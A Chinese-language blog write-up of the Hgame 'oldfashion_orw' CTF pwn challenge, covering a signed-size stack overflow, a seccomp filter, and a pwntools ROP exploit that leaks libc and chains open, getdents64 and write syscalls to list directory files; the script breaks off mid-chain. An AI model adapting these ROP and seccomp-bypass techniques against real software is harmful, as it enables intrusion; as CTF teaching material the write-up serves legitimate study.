<!DOCTYPE html>
<html lang="en"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <style>
        :root {
            --accent-color: #FF4D4D;
        }
    </style>

    
    
    
    
    
    

    
    <title>Hgame Week1 Oldfashion_orw复现</title>
    <meta name="description" content="">
    <meta name="keywords" content='Pwn'>

    <meta property="og:url" content="https://kingbridgess.github.io/posts/hgame-week1-oldfashion_orw%E5%A4%8D%E7%8E%B0/">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Hgame Week1 Oldfashion_orw复现">
    <meta property="og:description" content="">
    <meta property="og:image" content="">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Hgame Week1 Oldfashion_orw复现">
    <meta name="twitter:description" content="">
    <meta property="twitter:domain" content="https://kingbridgess.github.io/posts/hgame-week1-oldfashion_orw%E5%A4%8D%E7%8E%B0/">
    <meta property="twitter:url" content="https://kingbridgess.github.io/posts/hgame-week1-oldfashion_orw%E5%A4%8D%E7%8E%B0/">
    <meta name="twitter:image" content="">

    
    <link rel="canonical" href="https://kingbridgess.github.io/posts/hgame-week1-oldfashion_orw%E5%A4%8D%E7%8E%B0/" />

    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/normalize.min.css" media="print" onload="this.media='all'">
    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/main.css">
    <link disabled id="dark-theme" rel="stylesheet" href="https://kingbridgess.github.io/css/dark.css">

    <script src="https://kingbridgess.github.io/js/svg-injector.min.js"></script>
    <script src="https://kingbridgess.github.io/js/feather-icons.min.js"></script>
    <script src="https://kingbridgess.github.io/js/main.js"></script>

    
    
</head>
<body>
        <script type="text/javascript">
            
            setThemeByUserPref();
        </script><header class="header">
    <nav class="header-nav">

        

        <div class="nav-title">
            <a class="nav-brand" href="https://kingbridgess.github.io">BRIdGE</a>
        </div>

        <div class="nav-links">
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/posts/"> Posts </a>
            </div>
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/tags/"> Tags </a>
            </div>
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/about"> About </a>
            </div>
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/contact/"> Contact </a>
            </div>
            
            <div class="nav-link">
                <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
            </div>
            

            <span class="nav-icons-divider"></span>
            <div class="nav-link dark-theme-toggle">
                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
                <a>
                    <span id="theme-toggle-icon" data-feather="moon"></span>
                </a>
            </div>

            <div class="nav-link" id="hamburger-menu-toggle">
                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
                <a>
                    <span data-feather="menu"></span>
                </a>
            </div>

            
            <ul class="nav-hamburger-list visibility-hidden">
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/posts/"> Posts </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/tags/"> Tags </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/about"> About </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/contact/"> Contact </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
                </li>
                
                <li class="nav-item dark-theme-toggle">
                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
                    <a>
                        <span id="theme-toggle-icon" data-feather="moon"></span>
                    </a>
                </li>
            </ul>

        </div>
    </nav>
</header>
<main id="content">
    <div class="post container">
    <div class="post-header-section">
        <h1>Hgame Week1 Oldfashion_orw复现</h1>
        <small role="doc-subtitle"></small>
        <p class="post-date">
            February 9, 2022
        </p>

        <ul class="post-tags">
        
            <li class="post-tag"><a href="https://kingbridgess.github.io/tags/pwn">Pwn</a></li>
        
        </ul>
    </div>

    <div class="post-content">
        <p>
            <pre tabindex="0"><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__cdecl</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">int</span> argc, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>argv, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> result; <span style="color:#6272a4">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> buf[<span style="color:#bd93f9">40</span>]; <span style="color:#6272a4">// [rsp+0h] [rbp-30h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  size_t nbytes; <span style="color:#6272a4">// [rsp+28h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  init_io(argc, argv, envp);
</span></span><span style="display:flex;"><span>  disable_syscall();
</span></span><span style="display:flex;"><span>  write(<span style="color:#bd93f9">1</span>, <span style="color:#f1fa8c">&#34;size?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#bd93f9">6uLL</span>);
</span></span><span style="display:flex;"><span>  read(<span style="color:#bd93f9">0</span>, buf, <span style="color:#bd93f9">0x10uLL</span>);
</span></span><span style="display:flex;"><span>  nbytes <span style="color:#ff79c6">=</span> atoi(buf);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( (<span style="color:#ff79c6">__int64</span>)nbytes <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">32</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    write(<span style="color:#bd93f9">1</span>, <span style="color:#f1fa8c">&#34;content?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#bd93f9">9uLL</span>);
</span></span><span style="display:flex;"><span>    read(<span style="color:#bd93f9">0</span>, buf, (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)nbytes);
</span></span><span style="display:flex;"><span>    write(<span style="color:#bd93f9">1</span>, <span style="color:#f1fa8c">&#34;done!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#bd93f9">6uLL</span>);
</span></span><span style="display:flex;"><span>    result <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    write(<span style="color:#bd93f9">1</span>, <span style="color:#f1fa8c">&#34;you must be kidding</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#bd93f9">0x14uLL</span>);
</span></span><span style="display:flex;"><span>    result <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>输入-1绕过size限制。
disable_syscall中利用prctl禁用了许多系统函数。这是seccomp保护机制。
什么是seccomp?
seccomp: seccomp是一种内核中的安全机制，正常情况下，程序可以使用所有的syscall,这是不安全的，比如程序劫持程序流后通过execve的syscall来getshell。所以可以通过seccomp_init、seccomp_rule_add、seccomp_load配合 或者prctl来ban掉一些系统调用.</p>
<pre tabindex="0"><code>remake@remake-virtual-machine:~/ctf/pwn/hgame/oldfashion_orw/to_give_out$ seccomp-tools dump ./vuln
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x09 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0013
 0004: 0x15 0x08 0x00 0x0000003b  if (A == execve) goto 0013
 0005: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0013
 0006: 0x15 0x06 0x00 0x00000101  if (A == openat) goto 0013
 0007: 0x15 0x05 0x00 0x00000003  if (A == close) goto 0013
 0008: 0x15 0x04 0x00 0x00000055  if (A == creat) goto 0013
 0009: 0x15 0x03 0x00 0x00000086  if (A == uselib) goto 0013
 0010: 0x15 0x02 0x00 0x00000039  if (A == fork) goto 0013
 0011: 0x15 0x01 0x00 0x0000003a  if (A == vfork) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
</code></pre><p>所以可以写shellcode到bss，或者调用syscall进行orw(open read write)。vmmap看了一下bss是rw-p，只能ret2syscall。
但是这题连flag名字都不知道。观察题目附件</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span>rm /home/ctf/flag*
</span></span><span style="display:flex;"><span>cp /flag <span style="color:#f1fa8c">&#34;/home/ctf/flag`head /dev/urandom |cksum |md5sum |cut -c 1-20`&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> /home/ctf
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">exec</span> 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/usr/sbin/chroot --userspec<span style="color:#ff79c6">=</span>1000:1000 /home/ctf timeout <span style="color:#bd93f9">300</span> ./vuln
</span></span></code></pre></div><p>大意就是每次进来flag后面会多一串随机数，而且只能读当前的文件</p>
<p>复现时在本地弄了个类似的flag</p>
<pre tabindex="0"><code>remake@remake-virtual-machine:~/ctf/pwn/hgame/oldfashion_orw/to_give_out$ ls
a.py  _asm.py  flagacbd18db4cc2f85cedef654fccc4a4d8  ld-2.31.so  libc-2.31.so  start.sh  vuln
</code></pre><p>所以在orw之前，先要调用类似ls的命令并输出到stdout上</p>
<p>流程为：</p>
<p>open打开当前目录	-&gt;</p>
<p>getdents64从fd=3读取文件名到bss	-&gt;</p>
<p>write从bss输出文件名到stdout	-&gt;</p>
<p>write从bss读取flag_name到bss	-&gt;</p>
<p>read从stdin读flag_name到bss	-&gt;</p>
<p>open打开当前目录	-&gt;</p>
<p>read从fd=4读flag到bss	-&gt;</p>
<p>write从bss吧flag写到stdout</p>
<p>这里涉及到了fd，即文件描述符。简单地说，stdin,stdout,stderr分别对应0,1,2，这是linux系统固定的。每当新open一个文件，系统就会给文件绑定fd(同一个进程从3开始递增)。而fd的值作为orw各函数调用的参数之一。</p>
<p>大体思路有了，接下来就是小细节和无限debug(要死了呜呜呜)：</p>
<p>1.为了得到更多gadgets，需要先ret2libc</p>
<p>2.从stdin读数据的时机不太好把握，这里可以先write一些字符串，然后sendafter</p>
<p>3.一些关键函数的原型:</p>
<p><strong>open系统调用</strong>：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>include<span style="color:#ff79c6">&lt;</span>unistd.h<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">static</span> <span style="color:#ff79c6">inline</span> <span style="color:#8be9fd">long</span> open(<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span> name, <span style="color:#8be9fd">int</span> mode, <span style="color:#8be9fd">int</span> flags){
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> sys_open(name, mode, flags);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>mode：参数可选：</p>
<pre tabindex="0"><code> 32 #define S_IRWXU 00700     文件所有者可读可写可执行
 33 #define S_IRUSR 00400     文件所有者可读
 34 #define S_IWUSR 00200     文件所有者可写
 35 #define S_IXUSR 00100     文件所有者可执行
 36 
 37 #define S_IRWXG 00070     文件用户组可写可读可执行
 38 #define S_IRGRP 00040     文件用户组可读
 39 #define S_IWGRP 00020     文件用户组可写
 40 #define S_IXGRP 00010     文件用户组可执行
 41 
 42 #define S_IRWXO 00007     其他用户可写可读可执行
 43 #define S_IROTH 00004     其他用户可读
 44 #define S_IWOTH 00002     其他用户可写
 45 #define S_IXOTH 00001     其他用户可执行
</code></pre><p>flags：在fcntl.h中定义</p>
<pre tabindex="0"><code>  7 #define O_RDONLY             00
  8 #define O_WRONLY             01
  9 #define O_RDWR               02
 10 #define O_CREAT            0100 /* not fcntl */
 11 #define O_EXCL             0200 /* not fcntl */
 12 #define O_NOCTTY           0400 /* not fcntl */
 13 #define O_TRUNC           01000 /* not fcntl */
 14 #define O_APPEND          02000
 15 #define O_NONBLOCK        04000
 16 #define O_NDELAY        O_NONBLOCK
 17 #define O_SYNC           010000
 18 #define FASYNC           020000 /* fcntl, for BSD compatibility */
 19 #define O_DIRECT         040000 /* direct disk access hint */
 20 #define O_LARGEFILE     0100000
 21 #define O_DIRECTORY     0200000 /* must be a directory */
 22 #define O_NOFOLLOW      0400000 /* don&#39;t follow links */
</code></pre><p><strong>sys_getdents64</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>asmlinkage  <span style="color:#8be9fd">long</span>  sys_getdents64(<span style="color:#8be9fd">unsigned</span>  <span style="color:#8be9fd">int</span>  fd,  <span style="color:#ff79c6">struct</span>  linux_dirent64 __user  <span style="color:#ff79c6">*</span>  dirent, <span style="color:#8be9fd">unsigned</span>  <span style="color:#8be9fd">int</span>  count)
</span></span></code></pre></div><p>其中结构体linux_dirent64如下</p>
<pre tabindex="0"><code>struct linux_dirent64 {
	ino64_t d_ino; /* 64-bit inode number */
	off64_t d_off; /* 64-bit offset to next structure */
	unsigned short d_reclen; /* Size of this dirent */
	unsigned char d_type; /* File type */
	char d_name[]; /* Filename (null-terminated) */
};
</code></pre><p>其中d_name[]属性存储着我们要的文件名。由于第二个参数是指针，传一个bss段的地址进去就好，函数会把文件名写到bss上，后面再用write读出来
read/write的系统调用略了，查查就行
4.syscall; ret这个gadget要用ROPgadget的opcode来找。先用python3搞出opcode</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> binascii
</span></span><span style="display:flex;"><span>code<span style="color:#ff79c6">=</span>asm(<span style="color:#f1fa8c">&#39;syscall;ret&#39;</span>)
</span></span><span style="display:flex;"><span>opcode<span style="color:#ff79c6">=</span>binascii<span style="color:#ff79c6">.</span>b2a_hex(code)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(opcode)
</span></span></code></pre></div><p>然后在ROPgadget里&ndash;opcode xxx</p>
<p>exp:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># p=gdb.debug(&#39;./vuln&#39;,&#39;b * 0x4013DC&#39;)</span>
</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">=</span>process(<span style="color:#f1fa8c">&#39;./vuln&#39;</span>)
</span></span><span style="display:flex;"><span>libc<span style="color:#ff79c6">=</span>ELF(<span style="color:#f1fa8c">&#39;libc-2.31.so&#39;</span>)
</span></span><span style="display:flex;"><span>elf<span style="color:#ff79c6">=</span>ELF(<span style="color:#f1fa8c">&#39;./vuln&#39;</span>)
</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>log_level<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">ret2libc
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">write(1,got,??)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>pop_rdi_ret<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0x0000000000401443</span>
</span></span><span style="display:flex;"><span>pop_rsi_r15_ret<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0x0000000000401441</span>
</span></span><span style="display:flex;"><span>main<span style="color:#ff79c6">=</span>elf<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;main&#39;</span>]
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;p&#39;</span><span style="color:#ff79c6">*</span>(<span style="color:#bd93f9">0x30</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">8</span>)<span style="color:#ff79c6">+</span>p64(pop_rdi_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">1</span>)<span style="color:#ff79c6">+</span>p64(pop_rsi_r15_ret)<span style="color:#ff79c6">+</span>p64(elf<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;write&#39;</span>])<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">+</span>p64(elf<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;write&#39;</span>])<span style="color:#ff79c6">+</span>p64(main)
</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;-1&#39;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;content?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>,pay)
</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;done!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
</span></span><span style="display:flex;"><span>libc_base<span style="color:#ff79c6">=</span>u64(p<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">6</span>)<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>,<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>))<span style="color:#ff79c6">-</span>libc<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;write&#39;</span>]
</span></span><span style="display:flex;"><span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">&#39;libc_base:&#39;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc_base))
</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;-1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdx_r12_ret<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0x000000000011c371</span><span style="color:#ff79c6">+</span>libc_base
</span></span><span style="display:flex;"><span>pop_rax_ret<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0x000000000004a550</span><span style="color:#ff79c6">+</span>libc_base
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">help to find the input timming
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">write(1, &#34;you must be kidding</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;,20)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;p&#39;</span><span style="color:#ff79c6">*</span>(<span style="color:#bd93f9">0x30</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">8</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdi_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rsi_r15_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0x40200B</span>)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdx_r12_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">20</span>)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(elf<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;write&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">input .
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">read(0,bss1,1)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">bss-&gt;0x404000--0x405000
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>bss1<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0x404100</span>
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdi_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rsi_r15_ret)<span style="color:#ff79c6">+</span>p64(bss1)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdx_r12_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">1</span>)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(elf<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;read&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">open current dir
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">open(&#39;.&#39;,0,0)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">rax=2;rdi=dot;rsi=rdx=0
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>syscall_ret<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0x0000000000066229</span><span style="color:#ff79c6">+</span>libc_base
</span></span><span style="display:flex;"><span>pop_rax_ret<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0x000000000004a550</span><span style="color:#ff79c6">+</span>libc_base
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rax_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">2</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdi_ret)<span style="color:#ff79c6">+</span>p64(bss1)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rsi_r15_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdx_r12_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(syscall_ret)
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">ls and write into bss2
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">fd=3
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">getdents64(3,bss2,0x200)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">rax=217;rdi=3;rsi=bss2,rdx=0x600
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>bss2<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0x404200</span>
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rax_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">217</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdi_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">3</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rsi_r15_ret)<span style="color:#ff79c6">+</span>p64(bss2)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdx_r12_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0x200</span>)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(syscall_ret)
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">output filenames
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">write(1,bss2,0x100)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdi_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rsi_r15_ret)<span style="color:#ff79c6">+</span>p64(bss2)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdx_r12_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0x200</span>)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(elf<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;write&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">help to find the input timming
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">write(1, &#34;you must be kidding</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;,20)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdi_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rsi_r15_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0x40200B</span>)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdx_r12_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">20</span>)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(elf<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;write&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">input flag name to bss1
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">read(0,bss1,40)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
